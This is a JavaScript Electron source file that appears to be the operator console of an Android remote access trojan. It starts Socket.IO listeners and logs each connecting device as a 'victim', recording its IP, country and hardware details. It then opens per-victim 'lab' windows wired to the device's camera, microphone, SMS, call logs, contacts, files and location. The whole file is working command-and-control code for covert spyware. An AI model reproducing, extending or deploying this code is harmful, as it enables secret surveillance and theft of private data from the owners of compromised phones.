const { app, BrowserWindow } = require('electron')
const electron = require('electron');
const { ipcMain } = require('electron');
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;
//--------------------------------------------------------------
let win;
let display;
var windows = {};
const IOs = {};
//--------------------------------------------------------------

function createWindow() {
  // get Display Sizes
  display = electron.screen.getPrimaryDisplay();

  //------------------------SPLASH SCREEN INIT------------------------------------
  // create the splash window
  let splashWin = new BrowserWindow({
    width: 700,
    height: 500,
    frame: false,
    transparent: true,
    icon: __dirname + '/app/assets/img/icon.png',
    type: "splash",
    alwaysOnTop: true,
    show: false,
    position: "center",
    resizable: false,
    toolbar: false,
    fullscreen: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true
    }
  });

  // load splash file
  splashWin.loadFile(__dirname + '/app/splash.html');

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show();
  });

  // Emitted when the window is closed.
  splashWin.on('closed', () => {
    splashWin = null
  })

  //------------------------Main SCREEN INIT------------------------------------
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    width: 900,
    height: 690,
    show: false,
    resizable: false,
    position: "center",
    toolbar: false,
    fullscreen: false,
    transparent: true,
    frame: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true
    }
  });

  win.loadFile(__dirname + '/app/index.html');

  // Open DevTools
  win.webContents.openDevTools();

  win.on('closed', () => {
    win = null
  })

  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      splashWin.close();
      win.show();
    }, 2000);
  });
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow)

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow()
  }
})

//handle the Uncaught Exceptions

const listeningStatus = {}; // Object to track listening status for each port

ipcMain.on('SocketIO:Listen', function (event, port) {
  if (listeningStatus[port]) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  IOs[port] = io.listen(port, {
    maxHttpBufferSize: 1024 * 1024 * 100
  });
  IOs[port].sockets.pingInterval = 10000;
  IOs[port].sockets.pingTimeout = 10000;

  console.log(`[*] Socket.IO server listening on port ${port}`);

  IOs[port].sockets.on('connection', function (socket) {
    console.log('[+] New connection from:', socket.request.connection.remoteAddress);
    
    var address = socket.request.connection;
    var query = socket.handshake.query;
    console.log('[*] Handshake query:', query);
    
    var index = query.id;
    var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
    console.log('[*] Client IP:', ip);
    
    var country = null;
    var geo = geoip.lookup(ip);
    if (geo) {
      country = geo.country.toLowerCase();
      console.log('[*] Client country:', country);
    }

    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
    console.log('[+] Added new victim:', {
      ip: ip,
      port: address.remotePort,
      manufacturer: query.manf,
      model: query.model,
      release: query.release,
      id: query.id
    });

    let notification = new BrowserWindow({
      frame: false,
      x: display.bounds.width - 280,
      y: display.bounds.height - 78,
      show: false,
      width: 280,
      height: 78,
      resizable: false,
      toolbar: false,
      webPreferences: {
        nodeIntegration: true,
        enableRemoteModule: true
      }
    });

    notification.webContents.on('did-finish-load', function () {
      notification.show();
      setTimeout(function () {
        notification.destroy()
      }, 3000);
    });

    notification.webContents.victim = victimsList.getVictim(index);
    notification.loadFile(__dirname + '/app/notification.html');

    win.webContents.send('SocketIO:NewVictim', index);

    socket.on('disconnect', function () {
      victimsList.rmVictim(index);
      win.webContents.send('SocketIO:RemoveVictim', index);
      if (windows[index]) {
        windows[index].close();
        delete windows[index];
      }
    });
  });

  listeningStatus[port] = true;
  event.reply('SocketIO:Listen', '[√] Started Listening on Port: ' + port);
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    IOs[port].close();
    IOs[port] = null;
    event.reply('SocketIO:Stop', '[✓] Stopped listening on Port: ' + port);
    listeningStatus[port] = false; // Update listening status for the specific port
  } else {
    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
  }
});

process.on('uncaughtException', function (error) {
  if (error.code == "EADDRINUSE") {
    win.webContents.send('SocketIO:ListenError', "Address Already in Use");
  } else {
    electron.dialog.showErrorBox("ERROR", JSON.stringify(error));
  }
});

// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 700,
    height: 750,
    show: false,
    darkTheme: true,
    transparent: true,
    resizable: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true
    }
  })

  //add this window to windowsList
  windows[index] = child.id;
  //child.webContents.openDevTools();

  // pass the victim info to this victim lab
  child.webContents.victim = victimsList.getVictim(index).socket;
  child.loadFile(__dirname + '/app/' + page)

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    //on lab window closed remove all socket listners
    if (victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
    }
  })
});
